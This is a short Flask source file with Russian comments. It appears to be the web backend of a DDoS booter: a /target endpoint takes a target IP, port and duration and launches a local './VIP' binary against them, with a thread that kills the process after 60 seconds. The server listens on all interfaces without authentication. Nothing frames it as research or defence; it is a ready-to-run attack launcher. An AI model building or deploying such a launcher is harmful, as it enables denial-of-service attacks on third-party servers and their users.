from flask import Flask, request
import subprocess
import threading
import time
import os
import signal

app = Flask(__name__)

def hardcore_kill(pid, timeout=60):
    """Через 60 секунд убивает процесс максимально жёстко"""
    time.sleep(timeout)
    
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(2)
    except:
        pass

    try:
        os.kill(pid, signal.SIGKILL)
    except:
        pass

    try:
        os.system(f"kill -9 {pid} 2>/dev/null")
    except:
        pass


@app.route('/target')
def run_vip():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_str = request.args.get('time')

    if not ip or not port or not time_str:
        return "укажи ?ip=...&port=...&time=...", 400

    try:
        port_int = int(port)
        time_int = int(time_str)
    except:
        return "port и time должны быть числами", 400

    try:
        cmd = ["./VIP", ip, str(port_int), str(time_int), "2"]
        
        # Убрали preexec_fn — оставили только start_new_session
        p = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )

        # Запускаем киллер по PID
        threading.Thread(
            target=hardcore_kill,
            args=(p.pid, 60),
            daemon=True
        ).start()

        return f"запущено → {ip}:{port} на {time_str} сек", 200

    except FileNotFoundError:
        return "ошибка: файл ./VIP не найден", 500
    except PermissionError:
        return "ошибка: нет прав на запуск ./VIP (chmod +x ./VIP)", 500
    except Exception as e:
        return f"ошибка: {str(e)}", 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
